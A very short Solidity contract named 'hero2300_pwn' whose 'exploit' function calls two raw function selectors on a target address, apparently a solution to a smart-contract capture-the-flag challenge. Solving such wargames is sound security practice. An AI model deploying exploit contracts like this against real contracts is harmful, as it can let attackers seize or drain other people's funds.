contract hero2300_pwn
{
    function exploit(address addr) public 
    {
        addr.call(abi.encodeWithSelector(0x3c5269d8));
        addr.call(abi.encodeWithSelector(0x75ec067a));
    }
}